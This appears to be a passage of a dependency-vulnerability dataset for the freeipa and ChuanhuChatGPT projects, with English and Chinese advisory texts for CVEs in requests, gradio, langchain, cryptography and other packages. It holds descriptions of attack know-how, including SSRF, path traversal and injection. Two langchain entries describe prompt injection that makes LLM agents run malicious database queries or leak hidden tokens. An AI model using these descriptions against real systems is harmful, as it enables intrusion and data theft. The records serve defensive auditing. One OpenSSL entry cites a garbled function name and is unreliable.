Affected versions of this package are vulnerable to Race Condition in the `files/threads/connections` process.
## Remediation
Upgrade `psutil` to version 0.5.1 or higher.
## References
- [GitHub Commit](https://github.com/giampaolo/psutil/commit/163f29d25f4c5d573fbd436e658829afe95bc1d9)
",3,0
freeipa_freeipa,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
freeipa_freeipa,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
freeipa_freeipa,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
freeipa_freeipa,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
freeipa_freeipa,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
freeipa_freeipa,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
freeipa_freeipa,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
freeipa_freeipa,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
freeipa_freeipa,python-ldap,,True,,CWE-1333,2021-11-30,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",3,0
freeipa_freeipa,python-ldap,,True,CVE-2021-46823,CWE-1333,2021-11-30,"python-ldap是python-ldap开源的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.0之前版本存在安全漏洞，该漏洞源于 LDAP 模式解析器中存在正则表达式拒绝服务 (ReDoS) 缺陷。攻击者利用该漏洞通过发送特制的正则表达式输入导致拒绝服务。",3,0
freeipa_freeipa,python-ldap,,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
freeipa_freeipa,python-ldap,,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
freeipa_freeipa,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
freeipa_freeipa,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
freeipa_freeipa,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
freeipa_freeipa,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
freeipa_freeipa,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
freeipa_freeipa,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
freeipa_freeipa,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
freeipa_freeipa,python-ldap,,True,,CWE-1333,2021-11-30,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",3,0
freeipa_freeipa,python-ldap,,True,CVE-2021-46823,CWE-1333,2021-11-30,"python-ldap是python-ldap开源的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.0之前版本存在安全漏洞，该漏洞源于 LDAP 模式解析器中存在正则表达式拒绝服务 (ReDoS) 缺陷。攻击者利用该漏洞通过发送特制的正则表达式输入导致拒绝服务。",3,0
freeipa_freeipa,python-ldap,,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
freeipa_freeipa,python-ldap,,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
freeipa_freeipa,grunt,,True,CVE-2022-0436,CWE-22,2022-04-12,"Grunt是一个 JavaScript 任务运行器。
Grunt 1.5.2 之前存在路径遍历漏洞，目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",2,0
freeipa_freeipa,grunt,,True,CVE-2022-1537,CWE-367,2022-05-10,"Grunt是一个 JavaScript 任务运行器。
Grunt 1.5.3之前版本存在安全漏洞，该漏洞源于file.copy容易受到TOCTOU的影响攻击者利用该漏洞执行任意文件写入。",2,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-4941,CWE-22,,Gradio 是一个开源 Python 库，用于通过友好的 Web 界面演示机器学习模型。Gradio 4.25 版本中存在输入验证错误漏洞，该漏洞源于 `gradio/components/json_component.py` 的 `postprocess` 函数，由于路径验证不当，攻击者可以发送恶意的 JSON 对象，其中包含 `path` 键，进而读取远程系统上的文件，导致信息泄露。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-4940,CWE-601,,Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此库存在输入验证错误漏洞，该漏洞源于开放重定向的安全问题。攻击者可以通过构造恶意的 URL，将用户重定向到任意网站，从而进行网络钓鱼攻击、跨站脚本攻击 (XSS) 等。利用此漏洞，攻击者能够根据响应中的 'Location' 头或 '文件不允许' 错误判断内部网络中开放端口的状态，从而逐步扫描内部网络。,3,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-4325,CWE-918,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面简化机器学习模型的演示。该漏洞存在于 Gradio 4.21.0 版本的 `/queue/join` 端点和 `save_url_to_cache` 函数中。由于对用户输入的 `path` 参数未进行充分的验证，攻方可以通过发送特制请求实现对内部网络或 AWS 元数据端点的未授权访问。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47867,CWE-345,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在数据伪造问题漏洞，该漏洞源于如果攻击者获得下载 FRP 客户端的远程 URL 的访问权限，他们可以在不被发现的情况下修改二进制文件，因为 Gradio 服务器不会验证文件的校验和或签名。",4,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47167,CWE-918,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于Gradio 的 `async_save_url_to_cache` 函数允许攻击者强制 Gradio 服务器向用户控制的 URL 发送 HTTP 请求。",3,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47870,CWE-362,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在竞争条件问题漏洞，该漏洞源于攻击者利用该漏洞可以将用户流量重定向到恶意服务器。",2,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47084,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于攻击者利用该漏洞可以向本地 Gradio 服务器发出未经授权的请求。",3,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47872,CWE-79,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在跨站脚本漏洞，该漏洞源于经过身份验证的用户可以上传包含恶意脚本的文件，例如 HTML、JavaScript 或 SVG 文件。",3,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47869,CWE-203,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于比较不是在恒定时间内完成的，攻击者可以通过测量不同请求的响应时间来逐字节推断正确的哈希值，从而利用这一点。",4,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47168,CWE-670,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于即使在监控被禁用的情况下，攻击者或未经授权的用户仍然可以通过直接请求 /monitoring 端点来访问监控仪表板。",4,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47164,CWE-22,2024-10-10,<p>Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。 Gradio存在路径遍历漏洞，该漏洞源于is_in_or_equal函数旨在检查文件是否位于给定目录中，可以使用某些使用`..`序列操纵文件路径来绕过该函数。</p>,4,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47868,CWE-200 CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在信息泄露漏洞，该漏洞源于攻击者利用该漏洞可以通过制作绕过预期输入限制的请求来利用这些组件。",3,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47871,CWE-311,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于HTTPS 未在连接上强制执行。攻击者利用该漏洞可以拦截和读取上传到 Gradio 服务器的文件，以及修改客户端和服务器之间发送的响应或数据。",2,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47165,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于当 Gradio 服务器在本地部署时，`localhost_aliases` 变量包含“null”作为有效来源。",3,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-47166,CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在路径遍历漏洞，该漏洞源于攻击者利用该漏洞可以通过操纵请求中的文件路径来访问和泄露自定义 Gradio 组件的源代码。",4,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-48052,CWE-918,2024-11-04,Gradio 是一个用于通过友好的Web界面展示和分享机器学习模型的开源Python库，能够简化数据科学家和开发者演示他们模型的过程。在版本4.42.0的Gradio中，其gr.DownloadButton函数中存在服务器端请求伪造（SSRF）漏洞。攻击者可能利用该漏洞通过该功能发送精心构造的请求，从而导致服务器执行未授权的外部请求。,2,0
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-10648,CWE-29,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae。该漏洞源于 Gradio Audio 组件的路径遍历漏洞，攻击者能够控制音频文件格式，导致任意文件内容被删除。当存档文件被精心构造时，恶意的文件名可以遍历到提取目录之外，覆盖其他重要文件，例如配置文件或可执行文件，从而导致更为严重的影响。攻击者可以通过在 zip 文件中包含恶意路径名来利用此漏洞。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-8021,CWE-601,,Gradio是一个开源的Python库，旨在通过友好的Web界面来演示机器学习模型。该库的最新版本存在开放重定向漏洞，允许攻击者通过URL编码的方式将用户重定向到恶意网站。此漏洞的根本原因在于Gradio在处理重定向请求时未能对外部URL进行足够的验证。攻击者可以通过发送特制请求，导致服务器返回302重定向到攻击者控制的网站。,3,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-12217,CWE-22,,Gradio 是一个开源的 Python 库，旨在以友好的 Web 界面演示机器学习模型。该库在版本 git 67e4044 中存在一个路径遍历漏洞，其根本原因在于 blocked_path 功能的实现缺陷。具体来说，尽管该应用程序能正确阻止对类似 'C:/tmp/secret.txt' 的路径访问，但在使用 NTFS 备用数据流（ADS）语法时，例如 'C:/tmp/secret.txt::$DATA'，却未能阻止访问。这一缺陷可能导致未授权用户读取被阻止的文件路径。,3,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2024-10569,CWE-475,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae，在 dataframe 组件中存在安全漏洞。该漏洞源于组件使用 pd.read_csv 处理输入值，允许上传压缩文件。攻击者可以利用此漏洞，通过上传恶意构造的 zip 炸弹，导致服务器崩溃和拒绝服务（DoS）。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2025-0187,CWE-400,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。Gradio 版本 0.39.1 存在一个资源管理错误漏洞，该漏洞源于文件上传功能在处理带有大文件名的表单数据时的不当处理。攻击者可以通过发送包含过大文件名的 payload，使得服务器变得不响应，从而导致合法用户无法访问该服务。,2,1
GaiZhenbiao_ChuanhuChatGPT,gradio,4.29.0,True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
GaiZhenbiao_ChuanhuChatGPT,tqdm,,True,CVE-2016-10075,CWE-17,2016-12-25,"tqdm是一个快速、可扩展的Python进度条，它支持在Python长循环中添加一个进度提示信息。
tqdm 4.4.1版本和4.10版本中的tqdm._version模块存在安全漏洞。本地攻击者可利用该漏洞执行任意代码。",2,0
GaiZhenbiao_ChuanhuChatGPT,tqdm,,True,CVE-2024-34062,CWE-74,2024-05-03,"tqdm是tqdm开源的一个用于 Python 和 CLI 的快速、可扩展的进度条。
tqdm 4.66.3之前版本存在安全漏洞，该漏洞源于任何可选的非布尔 CLI 参数都可以通过 python 的 eval传递，允许任意代码执行。",3,0
GaiZhenbiao_ChuanhuChatGPT,Pygments,,True,CVE-2022-40896,CWE-434,2023-07-02,"Matthäus G. Chajdas pygments是 Matthäus G. Chajdas开源的一个应用软件。提供通用语法突出显示工具功能。
pygments 2.15.0及之前版本存在安全漏洞，该漏洞源于pygments/lexers/smithy.py存在正则表达式拒绝服务（ReDoS）漏洞。",3,0
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,CVE-2024-3095,CWE-918,,<p>LangChain 是一个通过可组合性构建应用程序的框架。该框架中的 Web Research Retriever 组件存在服务器端请求伪造 (SSRF) 漏洞。该漏洞发生的根本原因是该组件未对请求进行适当限制，允许其访问本地地址。攻击者利用该漏洞可以进行端口扫描、访问本地服务，并在云环境中读取实例元数据。尽管只允许通过 GET 请求进行攻击，但仍可能会影响机密性、完整性和可用性。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,CVE-2024-5998,CWE-502,,<p>LangChain 是一个开源的 Python 库，旨在通过组合性构建基于大语言模型的应用程序。在其 FAISS.deserialize_from_bytes 函数中，存在不信任数据的 pickle 反序列化漏洞。此漏洞的根源在于未能充分验证反序列化后的数据有效性，攻击者可以通过操控输入数据来执行任意命令，利用 os.system 函数。利用此漏洞，攻击者只需向应用程序发送恶意构造的序列化数据即可触发该漏洞。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,CVE-2024-8309,CWE-89 CWE-74,,<p>LangChain 是一个开源框架，用于开发由大型语言模型（LLM）支持的应用程序。版本 0.2.5 存在 SQL 注入漏洞，此漏洞源于 GraphCypherQAChain 类的不充分输入验证，攻击者可以通过提示注入恶意 SQL 命令来操纵、删除或创建数据。这可能导致未经授权的数据操纵、服务中断、数据泄露、多租户环境的安全漏洞和数据完整性问题。</p>,4,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>langchain_community是一个基于Python的开源库，旨在简化图形数据库与机器学习的集成。此漏洞存在于Neo4jVector类中，导致对用户输入的清理不足，允许攻击者通过node_label或embedding_node_property进行Cypher注入。攻击者可以通过不安全的用户输入创建、修改或删除数据库中的节点。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>Langchain 是一个用于构建语言模型应用程序的Python库。该漏洞影响到用 Playwright 浏览器工具包创建的 LLM 浏览器 AI 代理，当目标网站中包含 visibility:hidden 的元素时，外部攻击者可以通过恶意提示获取这些元素的值。这些元素可能包含用于安全目的的令牌，如 CSRF 令牌，此外在 OAuth 2.0 response_mode=form_post 中，包含了用于身份验证和授权的 ID 令牌和访问令牌。这一漏洞的根本原因在于在处理隐藏字段时缺乏严格的安全机制，从而导致通过被注入的恶意代码泄露重要的安全令牌。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>Langchain是一个用于处理文档的Python库，通过多个数据源加载器提取信息。当开发者将这些加载器的参数暴露给不可信的来源时，可能会导致XXE漏洞的出现。此漏洞的根本原因在于对外部实体的处理不当，攻击者可以通过构造恶意XML文件，利用XXE漏洞读取服务器上的敏感文件，如配置文件、源代码文件和数据备份等。此外，攻击者还可以利用该漏洞强制应用程序向内部或外部服务发送请求，可能对其他内部系统构成安全威胁。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>TiDBChatMessageHistory 类是 langchain 库的一部分，该类用于管理聊天消息的历史记录并从数据库加载消息。该漏洞源于对 parameters 参数 (earliest_time) 的类型未进行验证，攻击者可以通过构造恶意输入来控制数据库查询。具体而言，攻击者可以在 _load_messages_to_cache 方法中传入恶意的 earliest_time 值，从而执行任意 SQL 查询。这使得攻击者能够窃取数据库内容。</p>,3,1
